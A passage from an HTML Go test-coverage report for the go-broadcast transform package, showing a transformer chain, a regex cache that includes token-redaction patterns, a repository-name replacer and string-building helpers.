        "github.com/sirupsen/logrus"
)

// chain implements the Chain interface
type chain struct {
        transformers []Transformer
        logger       *logrus.Logger
}

// NewChain creates a new transformer chain
func NewChain(logger *logrus.Logger) Chain <span class="cov8" title="1">{
        return &amp;chain{
                transformers: []Transformer{},
                logger:       logger,
        }
}</span>

// Add appends a transformer to the chain
func (c *chain) Add(transformer Transformer) Chain <span class="cov8" title="1">{
        c.transformers = append(c.transformers, transformer)
        c.logger.WithField("transformer", transformer.Name()).Debug("Added transformer to chain")
        return c
}</span>

// Transform applies all transformers in sequence
func (c *chain) Transform(ctx context.Context, content []byte, transformCtx Context) ([]byte, error) <span class="cov8" title="1">{
        result := content

        c.logger.WithFields(logrus.Fields{
                "source_repo":  transformCtx.SourceRepo,
                "target_repo":  transformCtx.TargetRepo,
                "file_path":    transformCtx.FilePath,
                "transformers": len(c.transformers),
        }).Debug("Starting transform chain")

        for _, transformer := range c.transformers </span><span class="cov8" title="1">{
                select </span>{
                case &lt;-ctx.Done():<span class="cov8" title="1">
                        return nil, ctx.Err()</span>
                default:<span class="cov8" title="1"></span>
                }

                <span class="cov8" title="1">c.logger.WithFields(logrus.Fields{
                        "transformer": transformer.Name(),
                        "file_path":   transformCtx.FilePath,
                }).Debug("Applying transformer")

                transformed, err := transformer.Transform(result, transformCtx)
                if err != nil </span><span class="cov8" title="1">{
                        return nil, fmt.Errorf("transform %s failed: %w", transformer.Name(), err)
                }</span>

                <span class="cov8" title="1">if len(transformed) != len(result) || string(transformed) != string(result) </span><span class="cov8" title="1">{
                        c.logger.WithFields(logrus.Fields{
                                "transformer": transformer.Name(),
                                "file_path":   transformCtx.FilePath,
                                "size_before": len(result),
                                "size_after":  len(transformed),
                        }).Debug("Content transformed")
                }</span>

                <span class="cov8" title="1">result = transformed</span>
        }

        <span class="cov8" title="1">return result, nil</span>
}

// Transformers returns the list of transformers in the chain
func (c *chain) Transformers() []Transformer <span class="cov8" title="1">{
        // Return a copy to prevent external modification
        result := make([]Transformer, len(c.transformers))
        copy(result, c.transformers)
        return result
}</span>
</pre>

		<pre class="file" id="file80" style="display: none">// Package transform provides file content transformation capabilities
package transform

import (
        "fmt"
        "time"

        "github.com/mrz1836/go-broadcast/internal/config"
)

// DirectoryTransformContext extends the base Context with directory-specific metadata
// for tracking file transformations within directory sync operations.
type DirectoryTransformContext struct {
        Context

        // IsFromDirectory indicates if this transformation is part of a directory sync operation
        IsFromDirectory bool

        // DirectoryMapping contains the configuration for the directory being synced
        DirectoryMapping *config.DirectoryMapping

        // RelativePath represents the file's position within the source directory structure
        RelativePath string

        // FileIndex is the current file number being processed (0-based)
        FileIndex int

        // TotalFiles is the total number of files in the directory sync operation
        TotalFiles int

        // TransformStartTime records when the transformation began for performance metrics
        TransformStartTime time.Time
}

// NewDirectoryTransformContext creates a new DirectoryTransformContext with the provided parameters.
// The TransformStartTime is automatically set to the current time.
func NewDirectoryTransformContext(
        baseCtx Context,
        dirMapping *config.DirectoryMapping,
        relativePath string,
        fileIndex, totalFiles int,
) *DirectoryTransformContext <span class="cov8" title="1">{
        return &amp;DirectoryTransformContext{
                Context:            baseCtx,
                IsFromDirectory:    true,
                DirectoryMapping:   dirMapping,
                RelativePath:       relativePath,
                FileIndex:          fileIndex,
                TotalFiles:         totalFiles,
                TransformStartTime: time.Now(),
        }
}</span>

// GetTransformDuration returns the elapsed time since the transformation started.
// This is useful for performance monitoring and debugging slow transformations.
func (ctx *DirectoryTransformContext) GetTransformDuration() time.Duration <span class="cov8" title="1">{
        return time.Since(ctx.TransformStartTime)
}</span>

// String returns a human-readable representation of the DirectoryTransformContext
// for debugging and logging purposes.
func (ctx *DirectoryTransformContext) String() string <span class="cov8" title="1">{
        if !ctx.IsFromDirectory </span><span class="cov8" title="1">{
                return fmt.Sprintf("DirectoryTransformContext{FilePath: %s, IsFromDirectory: false}",
                        ctx.FilePath)
        }</span>

        <span class="cov8" title="1">return fmt.Sprintf(
                "DirectoryTransformContext{"+
                        "SourceRepo: %s, "+
                        "TargetRepo: %s, "+
                        "FilePath: %s, "+
                        "RelativePath: %s, "+
                        "Progress: %d/%d, "+
                        "DirectoryMapping: %s-&gt;%s, "+
                        "Duration: %v"+
                        "}",
                ctx.SourceRepo,
                ctx.TargetRepo,
                ctx.FilePath,
                ctx.RelativePath,
                ctx.FileIndex+1, // Display as 1-based for human readability
                ctx.TotalFiles,
                ctx.DirectoryMapping.Src,
                ctx.DirectoryMapping.Dest,
                ctx.GetTransformDuration(),
        )</span>
}
</pre>

		<pre class="file" id="file81" style="display: none">package transform

import (
        "context"

        "github.com/stretchr/testify/mock"
)

// MockTransformer is a mock implementation of the Transformer interface
type MockTransformer struct {
        mock.Mock
}

// NewMockTransformer creates a new MockTransformer (backward compatibility)
func NewMockTransformer() *MockTransformer <span class="cov0" title="0">{
        return &amp;MockTransformer{}
}</span>

// Name mock implementation
func (m *MockTransformer) Name() string <span class="cov8" title="1">{
        args := m.Called()
        return args.String(0)
}</span>

// Transform mock implementation
func (m *MockTransformer) Transform(content []byte, ctx Context) ([]byte, error) <span class="cov8" title="1">{
        args := m.Called(content, ctx)
        if args.Get(0) == nil </span><span class="cov8" title="1">{
                return nil, args.Error(1)
        }</span>
        <span class="cov8" title="1">return args.Get(0).([]byte), args.Error(1)</span>
}

// MockChain is a mock implementation of the Chain interface
type MockChain struct {
        mock.Mock
}

// NewMockChain creates a new MockChain (backward compatibility)
func NewMockChain() *MockChain <span class="cov0" title="0">{
        return &amp;MockChain{}
}</span>

// Add mock implementation
func (m *MockChain) Add(transformer Transformer) Chain <span class="cov8" title="1">{
        args := m.Called(transformer)
        if args.Get(0) == nil </span><span class="cov8" title="1">{
                return nil
        }</span>
        <span class="cov8" title="1">return args.Get(0).(Chain)</span>
}

// Transform mock implementation
func (m *MockChain) Transform(ctx context.Context, content []byte, transformCtx Context) ([]byte, error) <span class="cov8" title="1">{
        args := m.Called(ctx, content, transformCtx)
        if args.Get(0) == nil </span><span class="cov8" title="1">{
                return nil, args.Error(1)
        }</span>
        <span class="cov8" title="1">return args.Get(0).([]byte), args.Error(1)</span>
}

// Transformers mock implementation
func (m *MockChain) Transformers() []Transformer <span class="cov8" title="1">{
        args := m.Called()
        if args.Get(0) == nil </span><span class="cov8" title="1">{
                return nil
        }</span>
        <span class="cov8" title="1">return args.Get(0).([]Transformer)</span>
}
</pre>

		<pre class="file" id="file82" style="display: none">package transform

import (
        "regexp"
        "sync"
)

// RegexCache provides thread-safe regex compilation and caching
type RegexCache struct {
        cache    map[string]*regexp.Regexp
        mu       sync.RWMutex
        initOnce sync.Once
        stats    CacheStats
        patterns []string
        maxSize  int
}

// CacheStats tracks cache performance metrics
type CacheStats struct {
        hits   int64
        misses int64
        size   int
        mu     sync.RWMutex
}

// NewRegexCache creates a new regex cache with default patterns
func NewRegexCache() *RegexCache <span class="cov8" title="1">{
        return &amp;RegexCache{
                cache:   make(map[string]*regexp.Regexp),
                maxSize: 1000, // Reasonable cache size limit
                patterns: []string{
                        // GitHub repository patterns
                        `github\.com/([^/]+/[^/]+)`,
                        `^[a-zA-Z0-9][\w.-]*/[a-zA-Z0-9][\w.-]*$`, // Repository validation

                        // Branch patterns
                        `^[a-zA-Z0-9][\w./\-]*$`,                              // Branch validation
                        `^(chore/sync-files)-(\d{8})-(\d{6})-([a-fA-F0-9]+)$`, // Sync branch pattern

                        // Template variable patterns
                        `\{\{([A-Z_][A-Z0-9_]*)\}\}`, // {{VARIABLE}} format
                        `\$\{([A-Z_][A-Z0-9_]*)\}`,   // ${VARIABLE} format

                        // GitHub token patterns (for redaction)
                        `ghp_[a-zA-Z0-9]{4,}`,         // GitHub personal tokens
                        `ghs_[a-zA-Z0-9]{4,}`,         // GitHub app tokens
                        `github_pat_[a-zA-Z0-9_]{4,}`, // New GitHub PAT format
                        `ghr_[a-zA-Z0-9]{4,}`,         // GitHub refresh tokens

                        // Authentication patterns
                        `(Bearer|Token)\s+([^\s'"]+)`,                   // Bearer/Token headers
                        `JWT\s+([a-zA-Z0-9_.-]{20,})`,                   // JWT tokens
                        `(password|token|secret|key|api_key)=([^\s&amp;]+)`, // URL parameters
                        `://([^:]+):([^@]+)@`,                           // URL passwords

                        // Security patterns
                        `-----BEGIN[A-Z\s]+PRIVATE KEY-----[\s\S]*?-----END[A-Z\s]+PRIVATE KEY-----`, // SSH keys
                        `\b([a-zA-Z0-9+/]{40,}={0,2})\b`,                                             // Base64 secrets
                        `([A-Z_]*(?:TOKEN|SECRET|KEY|PASSWORD|PASS)[A-Z_]*=)([^\s]+)`,                // Environment variables
                        `\b[a-zA-Z_]*token[a-zA-Z0-9_]*\b`,                                           // Generic tokens

                        // File and content patterns
                        `[^a-zA-Z0-9/_-]`, // Invalid characters for branch names
                },
        }
}</span>

var (
        defaultCache *RegexCache //nolint:gochecknoglobals // Package-level singleton pattern
        cacheOnce    sync.Once   //nolint:gochecknoglobals // Package-level singleton pattern
)

// getDefaultCache returns the default regex cache, creating it if necessary
func getDefaultCache() *RegexCache <span class="cov8" title="1">{
        cacheOnce.Do(func() </span><span class="cov8" title="1">{
                defaultCache = NewRegexCache()
        }</span>)
        <span class="cov8" title="1">return defaultCache</span>
}

// initCommonPatterns pre-compiles common patterns into the cache
func (rc *RegexCache) initCommonPatterns() <span class="cov8" title="1">{
        // Pre-compile common patterns
        for _, pattern := range rc.patterns </span><span class="cov8" title="1">{
                if re, err := regexp.Compile(pattern); err == nil </span><span class="cov8" title="1">{
                        rc.cache[pattern] = re
                }</span>
                // Silently ignore compilation errors for invalid patterns
        }
}

// CompileRegex returns a compiled regex, using cache when possible.
//
// This function provides thread-safe access to a regex cache that eliminates
// repeated compilation overhead. It uses a double-checked locking pattern
// for optimal performance with concurrent access.
//
// Parameters:
// - pattern: Regular expression pattern string to compile
//
// Returns:
// - Compiled *regexp.Regexp instance
// - Error if pattern compilation fails
//
// Performance:
// - Fast path: Read-only cache lookup for cached patterns
// - Slow path: Compilation and caching for new patterns
// - Thread-safe: Uses RWMutex for concurrent access
func (rc *RegexCache) CompileRegex(pattern string) (*regexp.Regexp, error) <span class="cov8" title="1">{
        // Ensure common patterns are initialized
        rc.initOnce.Do(rc.initCommonPatterns)

        // Fast path: read from cache with read lock
        rc.mu.RLock()
        if re, ok := rc.cache[pattern]; ok </span><span class="cov8" title="1">{
                rc.mu.RUnlock()
                // Update cache statistics
                rc.stats.mu.Lock()
                rc.stats.hits++
                rc.stats.mu.Unlock()
                return re, nil
        }</span>
        <span class="cov8" title="1">rc.mu.RUnlock()

        // Slow path: compile and cache with write lock
        rc.mu.Lock()
        defer rc.mu.Unlock()

        // Double-check after acquiring write lock (another goroutine might have cached it)
        if re, ok := rc.cache[pattern]; ok </span><span class="cov0" title="0">{
                // Update cache statistics
                rc.stats.mu.Lock()
                rc.stats.hits++
                rc.stats.mu.Unlock()
                return re, nil
        }</span>

        // Compile the pattern
        <span class="cov8" title="1">re, err := regexp.Compile(pattern)
        if err != nil </span><span class="cov8" title="1">{
                // Update cache statistics
                rc.stats.mu.Lock()
                rc.stats.misses++
                rc.stats.mu.Unlock()
                return nil, err
        }</span>

        // Cache the compiled regex (implement simple size limit to prevent unbounded growth)
        <span class="cov8" title="1">if len(rc.cache) &lt; rc.maxSize </span><span class="cov8" title="1">{
                rc.cache[pattern] = re
        }</span>

        // Update cache statistics
        <span class="cov8" title="1">rc.stats.mu.Lock()
        rc.stats.misses++
        rc.stats.size = len(rc.cache)
        rc.stats.mu.Unlock()

        return re, nil</span>
}

// CompileRegex returns a compiled regex using the default cache.
func CompileRegex(pattern string) (*regexp.Regexp, error) <span class="cov8" title="1">{
        return getDefaultCache().CompileRegex(pattern)
}</span>

// MustCompileRegex compiles a regex pattern and panics if compilation fails.
//
// This is a convenience function for patterns that are known to be valid
// and should never fail compilation. It uses the same caching mechanism
// as CompileRegex for optimal performance.
//
// Parameters:
// - pattern: Regular expression pattern string to compile
//
// Returns:
// - Compiled *regexp.Regexp instance
//
// Panics:
// - If pattern compilation fails
func (rc *RegexCache) MustCompileRegex(pattern string) *regexp.Regexp <span class="cov8" title="1">{
        re, err := rc.CompileRegex(pattern)
        if err != nil </span><span class="cov8" title="1">{
                panic(err)</span>
        }
        <span class="cov8" title="1">return re</span>
}

// MustCompileRegex compiles a regex pattern using the default cache and panics if compilation fails.
func MustCompileRegex(pattern string) *regexp.Regexp <span class="cov8" title="1">{
        return getDefaultCache().MustCompileRegex(pattern)
}</span>

// GetCacheStats returns current cache performance statistics.
//
// Returns:
// - hits: Number of successful cache lookups
// - misses: Number of cache misses requiring compilation
// - size: Current number of cached patterns
//
// Usage:
// This function is useful for monitoring cache effectiveness and
// tuning cache size limits or pre-compilation strategies.
func (rc *RegexCache) GetCacheStats() (hits, misses int64, size int) <span class="cov8" title="1">{
        rc.stats.mu.RLock()
        defer rc.stats.mu.RUnlock()
        return rc.stats.hits, rc.stats.misses, rc.stats.size
}</span>

// GetCacheStats returns cache statistics from the default cache.
func GetCacheStats() (hits, misses int64, size int) <span class="cov8" title="1">{
        return getDefaultCache().GetCacheStats()
}</span>

// ClearCache removes all cached regex patterns.
//
// This function is primarily useful for testing or when patterns
// need to be refreshed. It preserves the pre-compiled common patterns
// by re-initializing them after clearing the cache.
func (rc *RegexCache) ClearCache() <span class="cov8" title="1">{
        rc.mu.Lock()
        defer rc.mu.Unlock()

        // Clear the cache
        rc.cache = make(map[string]*regexp.Regexp)

        // Reset statistics
        rc.stats.mu.Lock()
        rc.stats.hits = 0
        rc.stats.misses = 0
        rc.stats.size = 0
        rc.stats.mu.Unlock()

        // Re-initialize common patterns
        for _, pattern := range rc.patterns </span><span class="cov8" title="1">{
                if re, err := regexp.Compile(pattern); err == nil </span><span class="cov8" title="1">{
                        rc.cache[pattern] = re
                }</span>
        }

        // Update size after re-initialization
        <span class="cov8" title="1">rc.stats.mu.Lock()
        rc.stats.size = len(rc.cache)
        rc.stats.mu.Unlock()</span>
}

// ClearCache clears the default regex cache.
func ClearCache() <span class="cov8" title="1">{
        getDefaultCache().ClearCache()
}</span>

// PrecompilePatterns compiles and caches a list of patterns.
//
// This function is useful for warming the cache with application-specific
// patterns that are known to be used frequently.
//
// Parameters:
// - patterns: Slice of regex pattern strings to pre-compile
//
// Returns:
// - Number of patterns successfully compiled and cached
// - Slice of errors for patterns that failed to compile
func (rc *RegexCache) PrecompilePatterns(patterns []string) (int, []error) <span class="cov8" title="1">{
        var errors []error
        compiled := 0

        for _, pattern := range patterns </span><span class="cov8" title="1">{
                if _, err := rc.CompileRegex(pattern); err != nil </span><span class="cov8" title="1">{
                        errors = append(errors, err)
                }</span> else<span class="cov8" title="1"> {
                        compiled++
                }</span>
        }

        <span class="cov8" title="1">return compiled, errors</span>
}

// PrecompilePatterns pre-compiles patterns using the default cache.
func PrecompilePatterns(patterns []string) (int, []error) <span class="cov8" title="1">{
        return getDefaultCache().PrecompilePatterns(patterns)
}</span>
</pre>

		<pre class="file" id="file83" style="display: none">package transform

import (
        "errors"
        "fmt"
        "path/filepath"
        "regexp"
        "strings"
)

// ErrInvalidRepoFormat is returned when a repository format is invalid
var ErrInvalidRepoFormat = errors.New("invalid repository format")

// repoTransformer replaces repository names in specific contexts
type repoTransformer struct{}

// NewRepoTransformer creates a new repository name transformer
func NewRepoTransformer() Transformer <span class="cov8" title="1">{
        return &amp;repoTransformer{}
}</span>

// Name returns the name of this transformer
func (r *repoTransformer) Name() string <span class="cov8" title="1">{
        return "repository-name-replacer"
}</span>

// Transform applies repository name replacement to the content
func (r *repoTransformer) Transform(content []byte, ctx Context) ([]byte, error) <span class="cov8" title="1">{
        // Skip if source and target repos are the same
        if ctx.SourceRepo == ctx.TargetRepo </span><span class="cov8" title="1">{
                return content, nil
        }</span>

        // Extract repository names
        <span class="cov8" title="1">sourceParts := strings.Split(ctx.SourceRepo, "/")

        targetParts := strings.Split(ctx.TargetRepo, "/")
        if len(sourceParts) != 2 || len(targetParts) != 2 </span><span class="cov8" title="1">{
                return content, fmt.Errorf("%w: source=%s, target=%s", ErrInvalidRepoFormat, ctx.SourceRepo, ctx.TargetRepo)
        }</span>

        <span class="cov8" title="1">sourceOrg := sourceParts[0]
        sourceRepoName := sourceParts[1]
        targetOrg := targetParts[0]
        targetRepoName := targetParts[1]

        // Apply transformations based on file type
        result := content
        fileExt := strings.ToLower(filepath.Ext(ctx.FilePath))

        switch fileExt </span>{
        case ".go", ".mod":<span class="cov8" title="1">
                result = r.transformGoFile(result, sourceOrg, sourceRepoName, targetOrg, targetRepoName)</span>
        case ".md", ".txt", ".rst":<span class="cov8" title="1">
                result = r.transformDocumentation(result, sourceOrg, sourceRepoName, targetOrg, targetRepoName)</span>
        case ".yaml", ".yml", ".json":<span class="cov8" title="1">
                result = r.transformConfig(result, sourceOrg, sourceRepoName, targetOrg, targetRepoName)</span>
        default:<span class="cov8" title="1">
                // For other files, apply general transformations
                result = r.transformGeneral(result, sourceOrg, sourceRepoName, targetOrg, targetRepoName)</span>
        }

        <span class="cov8" title="1">return result, nil</span>
}

// transformGoFile handles Go-specific transformations
func (r *repoTransformer) transformGoFile(content []byte, sourceOrg, sourceRepo, targetOrg, targetRepo string) []byte <span class="cov8" title="1">{
        patterns := []struct {
                regex       *regexp.Regexp
                replacement string
        }{
                // Module declaration in go.mod
                {
                        regex:       regexp.MustCompile(`(?m)^module\s+github\.com/` + regexp.QuoteMeta(sourceOrg) + `/` + regexp.QuoteMeta(sourceRepo)),
                        replacement: fmt.Sprintf("module github.com/%s/%s", targetOrg, targetRepo),
                },
                // Import statements - match exact repo boundary
                {
                        regex:       regexp.MustCompile(`"github\.com/` + regexp.QuoteMeta(sourceOrg) + `/` + regexp.QuoteMeta(sourceRepo) + `("|/[^"]*")`),
                        replacement: fmt.Sprintf(`"github.com/%s/%s$1`, targetOrg, targetRepo),
                },
                // Import blocks - match when followed by slash, quote, or end
                {
                        regex:       regexp.MustCompile(`github\.com/` + regexp.QuoteMeta(sourceOrg) + `/` + regexp.QuoteMeta(sourceRepo) + `(/|"|$)`),
                        replacement: fmt.Sprintf(`github.com/%s/%s$1`, targetOrg, targetRepo),
                },
        }

        result := content
        for _, p := range patterns </span><span class="cov8" title="1">{
                result = p.regex.ReplaceAll(result, []byte(p.replacement))
        }</span>

        <span class="cov8" title="1">return result</span>
}

// transformDocumentation handles documentation transformations
func (r *repoTransformer) transformDocumentation(content []byte, sourceOrg, sourceRepo, targetOrg, targetRepo string) []byte <span class="cov8" title="1">{
        patterns := []struct {
                regex       *regexp.Regexp
                replacement string
        }{
                // GitHub URLs
                {
                        regex:       regexp.MustCompile(`https://github\.com/` + regexp.QuoteMeta(sourceOrg) + `/` + regexp.QuoteMeta(sourceRepo)),
                        replacement: fmt.Sprintf("https://github.com/%s/%s", targetOrg, targetRepo),
                },
                // Go package references
                {
                        regex:       regexp.MustCompile(`github\.com/` + regexp.QuoteMeta(sourceOrg) + `/` + regexp.QuoteMeta(sourceRepo)),
                        replacement: fmt.Sprintf("github.com/%s/%s", targetOrg, targetRepo),
                },
                // Plain org/repo references
                {
                        regex:       regexp.MustCompile(`\b` + regexp.QuoteMeta(sourceOrg) + `/` + regexp.QuoteMeta(sourceRepo) + `\b`),
                        replacement: fmt.Sprintf("%s/%s", targetOrg, targetRepo),
                },
                // Repository name in titles or badges
                {
                        regex:       regexp.MustCompile(`\b` + regexp.QuoteMeta(sourceRepo) + `\b`),
                        replacement: targetRepo,
                },
        }

        result := content
        for _, p := range patterns </span><span class="cov8" title="1">{
                result = p.regex.ReplaceAll(result, []byte(p.replacement))
        }</span>

        <span class="cov8" title="1">return result</span>
}

// transformConfig handles configuration file transformations
func (r *repoTransformer) transformConfig(content []byte, sourceOrg, sourceRepo, targetOrg, targetRepo string) []byte <span class="cov8" title="1">{
        patterns := []struct {
                regex       *regexp.Regexp
                replacement string
        }{
                // Repository references
                {
                        regex:       regexp.MustCompile(regexp.QuoteMeta(sourceOrg) + `/` + regexp.QuoteMeta(sourceRepo)),
                        replacement: fmt.Sprintf("%s/%s", targetOrg, targetRepo),
                },
                // Just the repository name when it appears alone
                {
                        regex:       regexp.MustCompile(`"` + regexp.QuoteMeta(sourceRepo) + `"`),
                        replacement: fmt.Sprintf(`"%s"`, targetRepo),
                },
        }

        result := content
        for _, p := range patterns </span><span class="cov8" title="1">{
                result = p.regex.ReplaceAll(result, []byte(p.replacement))
        }</span>

        <span class="cov8" title="1">return result</span>
}

// transformGeneral applies general transformations for other file types
func (r *repoTransformer) transformGeneral(content []byte, sourceOrg, sourceRepo, targetOrg, targetRepo string) []byte <span class="cov8" title="1">{
        // Only transform obvious repository references
        pattern := regexp.MustCompile(regexp.QuoteMeta(sourceOrg) + `/` + regexp.QuoteMeta(sourceRepo))
        return pattern.ReplaceAll(content, []byte(fmt.Sprintf("%s/%s", targetOrg, targetRepo)))
}</span>
</pre>

		<pre class="file" id="file84" style="display: none">package transform

import (
        "bytes"
        "strconv"
        "strings"

        "github.com/mrz1836/go-broadcast/internal/pool"
)

// BuildPath constructs a path from parts using strings.Builder with capacity pre-allocation.
//
// This function replaces inefficient string concatenation with "+" operator
// and provides optimized path building with minimal memory allocations.
//
// Parameters:
// - separator: String to use between path parts (e.g., "/", "-", "_")
// - parts: Variable number of string parts to join
//
// Returns:
// - Constructed path string
//
// Performance:
// - Pre-calculates total size to minimize reallocations
// - Uses strings.Builder for efficient construction
// - Optimized for common path building patterns
//
// Example:
//
//        path := BuildPath("/", "github.com", "user", "repo", "blob", "master", "README.md")
//        // Result: "github.com/user/repo/blob/main/README.md"
func BuildPath(separator string, parts ...string) string <span class="cov8" title="1">{
        if len(parts) == 0 </span><span class="cov8" title="1">{
                return ""
        }</span>

        <span class="cov8" title="1">if len(parts) == 1 </span><span class="cov8" title="1">{
                return parts[0]
        }</span>

        // Estimate total size to minimize allocations
        <span class="cov8" title="1">totalSize := len(separator) * (len(parts) - 1) // separators
        for _, part := range parts </span><span class="cov8" title="1">{
                totalSize += len(part)
        }</span>

        <span class="cov8" title="1">var sb strings.Builder
        sb.Grow(totalSize)

        sb.WriteString(transformBranchName(parts[0]))
        for i := 1; i &lt; len(parts); i++ </span><span class="cov8" title="1">{
                sb.WriteString(separator)
                sb.WriteString(transformBranchName(parts[i]))
        }</span>

        <span class="cov8" title="1">return sb.String()</span>
}

// BuildGitHubURL constructs a GitHub URL from repository and optional path components.
//
// Parameters:
// - repo: Repository in format "org/repo"
// - pathParts: Optional path components (e.g., "blob", "master", "README.md")
//
// Returns:
// - Complete GitHub URL
//
// Example:
//
//        url := BuildGitHubURL("user/repo", "blob", "master", "README.md")
//        // Result: "https://github.com/user/repo/blob/main/README.md"
func BuildGitHubURL(repo string, pathParts ...string) string <span class="cov8" title="1">{
        baseSize := len("https://github.com/") + len(repo)
        for _, part := range pathParts </span><span class="cov8" title="1">{
                baseSize += len("/") + len(part)
        }</span>

        <span class="cov8" title="1">var sb strings.Builder
        sb.Grow(baseSize)

        sb.WriteString("https://github.com/")
        sb.WriteString(repo)

        for _, part := range pathParts </span><span class="cov8" title="1">{
                sb.WriteByte('/')
                sb.WriteString(transformBranchName(part))
        }</span>

        <span class="cov8" title="1">return sb.String()</span>
}

// transformBranchName transforms legacy branch names to their modern equivalents
func transformBranchName(name string) string <span class="cov8" title="1">{
        if name == "master" </span><span class="cov8" title="1">{
                return "main"
        }</span>
        <span class="cov8" title="1">return name</span>
}

// BuildBranchName constructs a sync branch name with timestamp and commit SHA.
//
// Parameters:
// - prefix: Branch prefix (e.g., "chore/sync-files")
// - timestamp: Timestamp string (e.g., "20240101-120000")
// - commitSHA: Short commit SHA (e.g., "abc123")
//
// Returns:
// - Formatted branch name
//
// Example:
//
//        branch := BuildBranchName("chore/sync-files", "20240101-120000", "abc123")
//        // Result: "chore/sync-files-20240101-120000-abc123"
func BuildBranchName(prefix, timestamp, commitSHA string) string <span class="cov8" title="1">{
        // Pre-calculate size: prefix + "-" + timestamp + "-" + commitSHA
        totalSize := len(prefix) + 1 + len(timestamp) + 1 + len(commitSHA)

        var sb strings.Builder
        sb.Grow(totalSize)

        sb.WriteString(prefix)
        sb.WriteByte('-')
        sb.WriteString(timestamp)
        sb.WriteByte('-')
        sb.WriteString(commitSHA)

        return sb.String()
}</span>

// BuildCommitMessage constructs a commit message with optional details.
//
// Parameters:
// - action: Primary action (e.g., "sync", "update", "add")
// - subject: Subject of the action (e.g., "files from source repository")
// - details: Optional additional details
//
// Returns:
// - Formatted commit message
//
// Example:
//
//        msg := BuildCommitMessage("sync", "update files from source repository", "Modified: README.md, .github/workflows/ci.yml")
//        // Result: "sync: update files from source repository\n\nModified: README.md, .github/workflows/ci.yml"
func BuildCommitMessage(action, subject string, details ...string) string <span class="cov8" title="1">{
        // Base size: action + ": " + subject
        baseSize := len(action) + 2 + len(subject)

        if len(details) &gt; 0 </span><span class="cov8" title="1">{
                baseSize += 2 // "\n\n"
                for _, detail := range details </span><span class="cov8" title="1">{
                        baseSize += len(detail) + 1 // detail + "\n"
                }</span>
        }

        <span class="cov8" title="1">var sb strings.Builder
        sb.Grow(baseSize)

        sb.WriteString(action)
        sb.WriteString(": ")
        sb.WriteString(subject)

        if len(details) &gt; 0 </span><span class="cov8" title="1">{
                sb.WriteString("\n\n")
                for i, detail := range details </span><span class="cov8" title="1">{
                        sb.WriteString(detail)
                        if i &lt; len(details)-1 </span><span class="cov8" title="1">{
                                sb.WriteByte('\n')
                        }</span>
                }
        }

        <span class="cov8" title="1">return sb.String()</span>
}

// BuildFileList constructs a formatted list of files with optional prefix.
//
// Parameters:
// - files: Slice of file paths
// - prefix: Optional prefix for each file (e.g., "- ", "  ")
// - separator: Separator between files (e.g., "\n", ", ")
//
// Returns:
// - Formatted file list string
//
// Example:
//
//        list := BuildFileList([]string{"README.md", "main.go"}, "- ", "\n")
//        // Result: "- README.md\n- main.go"
func BuildFileList(files []string, prefix, separator string) string <span class="cov8" title="1">{
        if len(files) == 0 </span><span class="cov8" title="1">{
                return ""
        }</span>

        // Estimate total size
        <span class="cov8" title="1">totalSize := 0
        for _, file := range files </span><span class="cov8" title="1">{
                totalSize += len(prefix) + len(file)
        }</span>
        <span class="cov8" title="1">totalSize += len(separator) * (len(files) - 1)

        var sb strings.Builder
        sb.Grow(totalSize)

        for i, file := range files </span><span class="cov8" title="1">{
                if i &gt; 0 </span><span class="cov8" title="1">{
                        sb.WriteString(separator)
                }</span>
                <span class="cov8" title="1">sb.WriteString(prefix)
                sb.WriteString(file)</span>
        }

        <span class="cov8" title="1">return sb.String()</span>
}

// BuildKeyValuePairs constructs a formatted list of key-value pairs.
//
// Parameters:
// - pairs: Map of key-value pairs
// - keyValueSep: Separator between key and value (e.g., ": ", "=")
// - pairSep: Separator between pairs (e.g., "\n", ", ")
//
// Returns:
// - Formatted key-value string
//
// Example:
//
//        kvs := BuildKeyValuePairs(map[string]string{"repo": "user/repo", "branch": "master"}, ": ", "\n")
//        // Result: "repo: user/repo\nbranch: main"
func BuildKeyValuePairs(pairs map[string]string, keyValueSep, pairSep string) string <span class="cov8" title="1">{
        if len(pairs) == 0 </span><span class="cov8" title="1">{
                return ""
        }</span>

        // Convert map to slice for consistent ordering
        <span class="cov8" title="1">keys := make([]string, 0, len(pairs))
        totalSize := 0

        for key := range pairs </span><span class="cov8" title="1">{
                keys = append(keys, key)
                totalSize += len(key) + len(keyValueSep) + len(pairs[key])
        }</span>
        <span class="cov8" title="1">totalSize += len(pairSep) * (len(pairs) - 1)

        var sb strings.Builder
        sb.Grow(totalSize)

        for i, key := range keys </span><span class="cov8" title="1">{
                if i &gt; 0 </span><span class="cov8" title="1">{
                        sb.WriteString(pairSep)
                }</span>
                <span class="cov8" title="1">sb.WriteString(key)
                sb.WriteString(keyValueSep)
                sb.WriteString(transformBranchName(pairs[key]))</span>
        }

        <span class="cov8" title="1">return sb.String()</span>
}

// BuildLargeString constructs large strings using buffer pools for optimal memory usage.
//
// This function is designed for scenarios where the resulting string is expected
// to be large (&gt;8KB) and benefits from buffer pool allocation strategies.
//
// Parameters:
// - estimatedSize: Estimated final string size in bytes
// - fn: Function that builds the string using the provided buffer
//
// Returns:
// - Constructed string
// - Error from the building function
//
// Example:
//
//        result, err := BuildLargeString(50000, func(buf *bytes.Buffer) error {
//            for i := 0; i &lt; 1000; i++ {
//                buf.WriteString(fmt.Sprintf("Line %d\n", i))
//            }
//            return nil
//        })
func BuildLargeString(estimatedSize int, fn func(buf *bytes.Buffer) error) (string, error) <span class="cov8" title="1">{
        // For very large strings, use buffer pool integration
        if estimatedSize &gt; pool.LargeBufferThreshold </span><span class="cov8" title="1">{
                return pool.WithBufferResult(estimatedSize, func(buf *bytes.Buffer) (string, error) </span><span class="cov8" title="1">{
                        if err := fn(buf); err != nil </span><span class="cov0" title="0">{
                                return "", err
                        }</span>
                        <span class="cov8" title="1">return buf.String(), nil</span>
                })
        }

        // For smaller large strings, use strings.Builder directly but with buffer pool
        <span class="cov8" title="1">return pool.WithBufferResult(estimatedSize, func(buf *bytes.Buffer) (string, error) </span><span class="cov8" title="1">{
                if err := fn(buf); err != nil </span><span class="cov8" title="1">{
                        return "", err
                }</span>
                <span class="cov8" title="1">return buf.String(), nil</span>
        })
}

// BuildURLWithParams constructs a URL with query parameters.
//
// Parameters:
// - baseURL: Base URL without parameters
// - params: Map of parameter names to values
//
// Returns:
// - Complete URL with encoded parameters
//
// Example:
//
//        url := BuildURLWithParams("https://api.github.com/repos/user/repo", map[string]string{
//            "per_page": "100",
//            "state": "open",
//        })
//        // Result: "https://api.github.com/repos/user/repo?per_page=100&amp;state=open"
func BuildURLWithParams(baseURL string, params map[string]string) string <span class="cov8" title="1">{
